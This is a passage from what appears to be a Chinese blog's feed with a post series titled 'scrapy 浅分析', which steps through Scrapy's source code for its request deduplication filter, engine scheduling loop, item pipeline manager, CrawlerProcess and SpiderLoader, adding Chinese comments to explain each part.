self.logdupes = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        spider.crawler.stats.inc_value(<span class="string">'dupefilter/filtered'</span>, spider=spider)</span><br></pre></td></tr></table></figure><p>按注释来其即对重复的请求进行过滤，即：</p><p>scrpay默认使用自带的去重组件为”RFPDupeFilter”(请求指纹重复过滤器). 这个组件通过python自带的set数据类型, 通过判断新请求链接是否在”集合”中, 来判断这个请求链接是否重复. <code>yield scheduler.open(spider</code>执行完后就是<code>yield self.scraper.open_spider(spider)</code>进入core文件夹下<code>scrapy.py</code>文件得：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@defer.inlineCallbacks</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">        <span class="string">"""Open the given spider for scraping and allocate resources for it"""</span></span><br><span class="line">        self.slot = Slot()</span><br><span class="line">        <span class="keyword">yield</span> self.itemproc.open_spider(spider)</span><br></pre></td></tr></table></figure><p>需要调用itemproc的open_spider方法，从文件中找到如下信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">itemproc_cls = load_object(crawler.settings[<span class="string">'ITEM_PROCESSOR'</span>])</span><br><span class="line">self.itemproc = itemproc_cls.from_crawler(crawler)</span><br><span class="line">ITEM_PROCESSOR = <span class="string">'scrapy.pipelines.ItemPipelineManager'</span></span><br></pre></td></tr></table></figure><p>则进入pipelines文件夹对应文件下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ItemPipelineManager</span><span class="params">(MiddlewareManager)</span>:</span></span><br><span class="line"></span><br><span class="line">    component_name = <span class="string">'item pipeline'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_get_mwlist_from_settings</span><span class="params">(cls, settings)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> build_component_list(settings.getwithbase(<span class="string">'ITEM_PIPELINES'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_add_middleware</span><span class="params">(self, pipe)</span>:</span></span><br><span class="line">        super(ItemPipelineManager, self)._add_middleware(pipe)</span><br><span class="line">        <span class="keyword">if</span> hasattr(pipe, <span class="string">'process_item'</span>):</span><br><span class="line">            self.methods[<span class="string">'process_item'</span>].append(pipe.process_item)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._process_chain(<span class="string">'process_item'</span>, item, spider)</span><br></pre></td></tr></table></figure><p>加入中间件，我们知道pipeline处理输出，这里加一些中间件，做一点初始化工作。最后回到调度这里开始</p><p><code>slot.nextcall.schedule()</code>,前面说了这里会调用<code>_next_request</code>方法，设计到的主要函数如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crawl</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        <span class="keyword">assert</span> spider <span class="keyword">in</span> self.open_spiders, \</span><br><span class="line">            <span class="string">"Spider %r not opened when crawling: %s"</span> % (spider.name, request)</span><br><span class="line">      <span class="comment">#进行调度</span></span><br><span class="line">        self.schedule(request, spider)</span><br><span class="line">        <span class="comment">#下一次调度</span></span><br><span class="line">        self.slot.nextcall.schedule()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">schedule</span><span class="params">(self, request, spider)</span>:</span></span><br><span class="line">        self.signals.send_catch_log(signal=signals.request_scheduled,</span><br><span class="line">                request=request, spider=spider)</span><br><span class="line">    <span class="comment">#request放入调度中</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.slot.scheduler.enqueue_request(request):</span><br><span class="line">            self.signals.send_catch_log(signal=signals.request_dropped,</span><br><span class="line">                                        request=request, spider=spider)</span><br><span class="line"><span class="comment">#具体request进入队列情况，core文件夹scheduler.py和default_setting下均有，代码一样，可重写</span></span><br><span class="line"><span class="comment">#其中上面有提到的两种形式内存或者磁盘，同时还会就是重复过滤操作</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enqueue_request</span><span class="params">(self, request)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request.dont_filter <span class="keyword">and</span> self.df.request_seen(request):</span><br><span class="line">            self.df.log(request, self.spider)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        dqok = self._dqpush(request)</span><br><span class="line">        <span class="keyword">if</span> dqok:</span><br><span class="line">            self.stats.inc_value(<span class="string">'scheduler/enqueued/disk'</span>, spider=self.spider)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self._mqpush(request)</span><br><span class="line">            self.stats.inc_value(<span class="string">'scheduler/enqueued/memory'</span>, spider=self.spider)</span><br><span class="line">        self.stats.inc_value(<span class="string">'scheduler/enqueued'</span>, spider=self.spider)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_next_request</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">        slot = self.slot</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> slot:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"><span class="comment">#暂停</span></span><br><span class="line">        <span class="keyword">if</span> self.paused:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"><span class="comment">#等待</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._needs_backout(spider):</span><br><span class="line">          <span class="comment">#第一次调度中无下一个，等后面放进去了就有了</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self._next_request_from_scheduler(spider):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="comment">#下一次有request并且不需要等待</span></span><br><span class="line">        <span class="keyword">if</span> slot.start_requests <span class="keyword">and</span> <span class="keyword">not</span> self._needs_backout(spider):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">              <span class="comment">#拿出下一次request</span></span><br><span class="line">                request = next(slot.start_requests)</span><br><span class="line">            <span class="keyword">except</span> StopIteration:</span><br><span class="line">                slot.start_requests = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                slot.start_requests = <span class="literal">None</span></span><br><span class="line">                logger.error(<span class="string">'Error while obtaining start requests'</span>,</span><br><span class="line">                             exc_info=<span class="literal">True</span>, extra=&#123;<span class="string">'spider'</span>: spider&#125;)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">              <span class="comment">#没错误就执行crawl，将request放入调度中</span></span><br><span class="line">                self.crawl(request, spider)</span><br><span class="line"><span class="comment">#空则关闭</span></span><br><span class="line">        <span class="keyword">if</span> self.spider_is_idle(spider) <span class="keyword">and</span> slot.close_if_idle:</span><br><span class="line">            self._spider_idle(spider)</span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">_needs_backout</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">        slot = self.slot</span><br><span class="line">    <span class="comment">#等待条件</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">not</span> self.running \</span><br><span class="line">            <span class="keyword">or</span> slot.closing \</span><br><span class="line">            <span class="keyword">or</span> self.downloader.needs_backout() \</span><br><span class="line">            <span class="keyword">or</span> self.scraper.slot.needs_backout()</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">_next_request_from_scheduler</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">        slot = self.slot</span><br><span class="line">        request = slot.scheduler.next_request()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> request:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment">#去下载</span></span><br><span class="line">        d = self._download(request, spider)</span><br><span class="line">        d.addBoth(self._handle_downloader_output, request, spider)</span><br><span class="line">        d.addErrback(<span class="keyword">lambda</span> f: logger.info(<span class="string">'Error while handling downloader output'</span>,</span><br><span class="line">                                           exc_info=failure_to_exc_info(f),</span><br><span class="line">                                           extra=&#123;<span class="string">'spider'</span>: spider&#125;))</span><br><span class="line">        d.addBoth(<span class="keyword">lambda</span> _: slot.remove_request(request))</span><br><span class="line">        d.addErrback(<span class="keyword">lambda</span> f: logger.info(<span class="string">'Error while removing request from slot'</span>,</span><br><span class="line">                                           exc_info=failure_to_exc_info(f),</span><br><span class="line">                                           extra=&#123;<span class="string">'spider'</span>: spider&#125;))</span><br><span class="line">        d.addBoth(<span class="keyword">lambda</span> _: slot.nextcall.schedule())</span><br><span class="line">        d.addErrback(<span class="keyword">lambda</span> f: logger.info(<span class="string">'Error while scheduling new request'</span>,</span><br><span class="line">                                           exc_info=failure_to_exc_info(f),</span><br><span class="line">                                           extra=&#123;<span class="string">'spider'</span>: spider&#125;))</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">spider_is_idle</span><span class="params">(self, spider)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.scraper.slot.is_idle():</span><br><span class="line">            <span class="comment"># scraper is not idle</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.downloader.active:</span><br><span class="line">            <span class="comment"># downloader has pending requests</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.slot.start_requests <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># not all start requests are handled</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.slot.scheduler.has_pending_requests():</span><br><span class="line">            <span class="comment"># scheduler has pending requests</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure><p>到此，官方框架的第三步也结束了，要去做第四步下载。</p><h1 id="0x02小结："><a href="#0x02小结：" class="headerlink" title="0x02小结："></a>0x02小结：</h1><p>这次就是这么几个过程：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>引擎打开一个网站(<span class="built_in">open</span> <span class="keyword">a</span> domain)，找到处理该网站的Spider并向该spider请求第一个要爬取的<span class="built_in">URL</span>(s)。</span><br><span class="line"><span class="number">2.</span>引擎从Spider中获取到第一个要爬取的<span class="built_in">URL</span>并在调度器(Scheduler)以Request调度。</span><br><span class="line"><span class="number">3</span>。引擎向调度器请求下一个要爬取的<span class="built_in">URL</span>。</span><br><span class="line"><span class="number">4.</span>调度器返回下一个要爬取的<span class="built_in">URL</span>给引擎，引擎将<span class="built_in">URL</span>通过下载中间件(请求(request)方向)转发给下载器(Downloader)。</span><br></pre></td></tr></table></figure><p>调度器将请求弄好成一个队列形式，加上去重处理，待引擎调用时返回给引擎，其中会有一些pipelines的简单初始化和中间件等处理。许多地方可由自己操作，如引擎给调度器request可以作处理，去重与否，队列采取与否都可以自己设置。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00.前言&quot;&gt;&lt;/a&gt;0x00.前言&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://myndtt.com/2018/01/30/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%B8%80/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;前面一&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://myndtt.com/2018/01/31/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%BA%8C/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;前面二&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这次看看引擎里面的东西。在此之前看看文档中的流程&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Scrapy中的数据流由执行引擎控制，其过程如下:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;1.引擎打开一个网站(open a domain)，找到处理该网站的Spider并向该spider请求第一个要爬取的URL(s)。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2.引擎从Spider中获取到第一个要爬取的URL并在调度器(Scheduler)以Request调度。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3引擎向调度器请求下一个要爬取的URL。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4.调度器返回下一个要爬取的URL给引擎，引擎将URL通过下载中间件(请求(request)方向)转发给下载器(Downloader)。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;------------------------------------------------------------------（下面下一篇提到）&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5.一旦页面下载完毕，下载器生成一个该页面的Response，并将其通过下载中间件(返回(response)方向)发送给引擎。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6.引擎从下载器中接收到Response并通过Spider中间件(输入方向)发送给Spider处理。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7.Spider处理Response并返回爬取到的Item及(跟进的)新的Request给引擎。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8.引擎将(Spider返回的)爬取到的Item给Item Pipeline，将(Spider返回的)Request给调度器。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9.(从第二步)重复直到调度器中没有更多地request，引擎关闭该网站。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h1 id=&quot;0x01-引擎&quot;&gt;&lt;a href=&quot;#0x01-引擎&quot; class=&quot;headerlink&quot; title=&quot;0x01.引擎&quot;&gt;&lt;/a&gt;0x01.引擎&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://myndtt.github.io/images/59.png&quot; alt=&quot;59&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://myndtt.github.io/tags/python/"/>
    
      <category term="scrapy" scheme="https://myndtt.github.io/tags/scrapy/"/>
    
  </entry>
  
  <entry>
    <title>scrapy 浅分析(二)</title>
    <link href="https://myndtt.github.io/2018/01/31/scrapy-%E6%B5%85%E5%88%86%E6%9E%90-%E4%BA%8C/"/>
    <id>https://myndtt.github.io/2018/01/31/scrapy-浅分析-二/</id>
    <published>2018-01-31T02:46:24.000Z</published>
    <updated>2019-09-22T05:04:46.318Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00.前言"></a>0x00.前言</h1><p><a href="https://myndtt.github.io/2018/01/30/scrapy-浅分析-一/">前面提到了</a>，所以目前要开始从<code>crawl</code>说起，也即<code>cmdline.py</code>文件里面的如下代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd.crawler_process = CrawlerProcess(settings)</span><br><span class="line">_run_print_help(parser, _run_command, cmd, args, opts)</span><br><span class="line">sys.exit(cmd.exitcode)</span><br></pre></td></tr></table></figure><p>所以先进入<code>crawler.py</code>文件找到<code>CrawlerProcess</code>类。</p><a id="more"></a><h1 id="0x01-进入引擎前奏"><a href="#0x01-进入引擎前奏" class="headerlink" title="0x01.进入引擎前奏"></a>0x01.进入引擎前奏</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CrawlerProcess</span><span class="params">(CrawlerRunner)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    #一个进程运行多个scrapy爬虫</span></span><br><span class="line"><span class="string">    A class to run multiple scrapy crawlers in a process simultaneously.</span></span><br><span class="line"><span class="string">#继承crawlerRunner类，加上了停止机制，还有一个异步机制</span></span><br><span class="line"><span class="string">    This class extends :class:`~scrapy.crawler.CrawlerRunner` by adding support</span></span><br><span class="line"><span class="string">    for starting a Twisted `reactor`_ and handling shutdown signals, like the</span></span><br><span class="line"><span class="string">    keyboard interrupt command Ctrl-C. It also configures top-level logging.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This utility should be a better fit than</span></span><br><span class="line"><span class="string">    :class:`~scrapy.crawler.CrawlerRunner` if you aren't running another</span></span><br><span class="line"><span class="string">    Twisted `reactor`_ within your application.</span></span><br><span class="line"><span class="string">#需要导入一份配置</span></span><br><span class="line"><span class="string">    The CrawlerProcess object must be instantiated with a</span></span><br><span class="line"><span class="string">    :class:`~scrapy.settings.Settings` object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This class shouldn't be needed (since Scrapy is responsible of using it</span></span><br><span class="line"><span class="string">    accordingly) unless writing scripts that manually handle the crawling</span></span><br><span class="line"><span class="string">    process. See :ref:`run-from-script` for an example.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, settings=None)</span>:</span></span><br><span class="line">      <span class="comment">#调用父类并初始化，请注意这里是并，父类要运行</span></span><br><span class="line">        super(CrawlerProcess, self).__init__(settings)</span><br><span class="line">        install_shutdown_handlers(self._signal_shutdown)</span><br><span class="line">        configure_logging(self.settings)</span><br><span class="line">        log_scrapy_info(self.settings)</span><br></pre></td></tr></table></figure><p>关于那个异步机制，这里有介绍<a href="https://www.cnblogs.com/LittleHann/p/5232318.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="noopener">https://www.cnblogs.com/LittleHann/p/5232318.html?utm_source=tuicool&amp;utm_medium=referral</a></p><p>这不是重点，只要知道爬虫这里用到这个异步机制就好了。父类<code>CrawlerRunner</code>初始化如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, settings=None)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> isinstance(settings, dict) <span class="keyword">or</span> settings <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            settings = Settings(settings)</span><br><span class="line">        self.settings = settings</span><br><span class="line">        self.spider_loader = _get_spider_loader(settings)</span><br><span class="line">        self._crawlers = set()</span><br><span class="line">        self._active = set()</span><br></pre></td></tr></table></figure><p>这里调用了<code>_get_spider_loader</code>函数，跟进得：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_spider_loader</span><span class="params">(settings)</span>:</span></span><br><span class="line">    <span class="string">""" Get SpiderLoader instance from settings """</span></span><br><span class="line">    <span class="keyword">if</span> settings.get(<span class="string">'SPIDER_MANAGER_CLASS'</span>):<span class="comment">#实际上我对应的没有这个</span></span><br><span class="line">        warnings.warn(</span><br><span class="line">            <span class="string">'SPIDER_MANAGER_CLASS option is deprecated. '</span></span><br><span class="line">            <span class="string">'Please use SPIDER_LOADER_CLASS.'</span>,</span><br><span class="line">            category=ScrapyDeprecationWarning, stacklevel=<span class="number">2</span></span><br><span class="line">        )</span><br><span class="line">    cls_path = settings.get(<span class="string">'SPIDER_MANAGER_CLASS'</span>,</span><br><span class="line">                            settings.get(<span class="string">'SPIDER_LOADER_CLASS'</span>))</span><br><span class="line">    loader_cls = load_object(cls_path)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        verifyClass(ISpiderLoader, loader_cls)</span><br><span class="line">    <span class="keyword">except</span> DoesNotImplement:</span><br><span class="line">        warnings.warn(</span><br><span class="line">            <span class="string">'SPIDER_LOADER_CLASS (previously named SPIDER_MANAGER_CLASS) does '</span></span><br><span class="line">            <span class="string">'not fully implement scrapy.interfaces.ISpiderLoader interface. '</span></span><br><span class="line">            <span class="string">'Please add all missing methods to avoid unexpected runtime errors.'</span>,</span><br><span class="line">            category=ScrapyDeprecationWarning, stacklevel=<span class="number">2</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> loader_cls.from_settings(settings.frozencopy())</span><br></pre></td></tr></table></figure><p>按函数名字，这里是要加载配置文件里面一些东西，<code>settings.get(&#39;SPIDER_LOADER_CLAS&#39;)</code>而默认配置文件里面有这么一句<code>SPIDER_LOADER_CLASS = &#39;scrapy.spiderloader.SpiderLoader&#39;</code>，得嘞跟进去<code>spiderloader.py</code>文件找到相应类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@implementer(ISpiderLoader)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SpiderLoader</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    #加载所有爬虫</span></span><br><span class="line"><span class="string">    SpiderLoader is a class which locates and loads spiders</span></span><br><span class="line"><span class="string">    in a Scrapy project.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, settings)</span>:</span></span><br><span class="line">        self.spider_modules = settings.getlist(<span class="string">'SPIDER_MODULES'</span>)</span><br><span class="line">        self.warn_only = settings.getbool(<span class="string">'SPIDER_LOADER_WARN_ONLY'</span>)</span><br><span class="line">        self._spiders = &#123;&#125;<span class="comment">#字典</span></span><br><span class="line">        self._found = defaultdict(list)</span><br><span class="line">        self._load_all_spiders()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_name_duplicates</span><span class="params">(self)</span>:</span></span><br><span class="line">        dupes = [<span class="string">"\n"</span>.join(<span class="string">"  &#123;cls&#125; named &#123;name!r&#125; (in &#123;module&#125;)"</span>.format(</span><br><span class="line">                                module=mod, cls=cls, name=name)</span><br><span class="line">                           <span class="keyword">for</span> (mod, cls) <span class="keyword">in</span> locations)</span><br><span class="line">                 <span class="keyword">for</span> name, locations <span class="keyword">in</span> self._found.items()</span><br><span class="line">                 <span class="keyword">if</span> len(locations)&gt;<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> dupes:</span><br><span class="line">            msg = (<span class="string">"There are several spiders with the same name:\n\n"</span></span><br><span class="line">                   <span class="string">"&#123;&#125;\n\n  This can cause unexpected behavior."</span>.format(</span><br><span class="line">                        <span class="string">"\n\n"</span>.join(dupes)))</span><br><span class="line">            warnings.warn(msg, UserWarning)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_load_spiders</span><span class="params">(self, module)</span>:</span></span><br><span class="line">      <span class="comment">#组成字典</span></span><br><span class="line">        <span class="keyword">for</span> spcls <span class="keyword">in</span> iter_spider_classes(module):</span><br><span class="line">            self._found[spcls.name].append((module.__name__, spcls.__name__))</span><br><span class="line">            self._spiders[spcls.name] = 